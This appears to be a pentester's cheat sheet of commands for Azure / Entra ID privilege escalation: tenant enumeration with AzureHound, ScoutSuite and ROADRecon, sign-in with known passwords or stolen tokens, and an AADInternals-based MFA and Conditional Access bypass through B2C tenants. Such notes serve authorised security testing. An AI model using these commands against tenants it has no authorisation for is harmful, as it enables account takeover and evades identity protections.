# Privilege Escalation
*   Authenticated Enumeration
    *   AzureHound
    *   Azure ScoutSuite
        *   `scout azure --cli --report-dir [OUTPUT_DIRECTORY]`
    *   ROADRecon
        *   `roadrecon.exe auth -u [user-email]` + input password
        *   `roadrecon.exe dump`
        *   `roadrecon plugin policies` + inspect the `caps.html` file
        *   `roadrecon gui -d [DB FILE]`
*   With password
    *   AzureAD Module
        *   `Import-Module -Name AzureAD`  
            `$password = ConvertTo-SecureString '[password]' -AsPlainText -Force`  
            `$creds = New-Object System.Management.Automation.PSCredential('[username]@[tenant_domain]', $password)`  
            `Connect-AzureAD -Credential $creds`
    *   AZ-CLI
        *   `az login -u "[USER]" -p "[PASS]" --allow-no-subscriptions`
    *   MFA/CA Bypass via B2C tenants
        *   `GetAADIntAccessTokenForAzureCoreManagement -savetocache -Tenant b2c.[domain-name]`
        *   `Get-AADIntAzureTenants`
        *   You can now access the tenants the user is a member of without MFA
*   With token
    *   `Connect-AzAccount -Token [token] -AccountId [user_id]`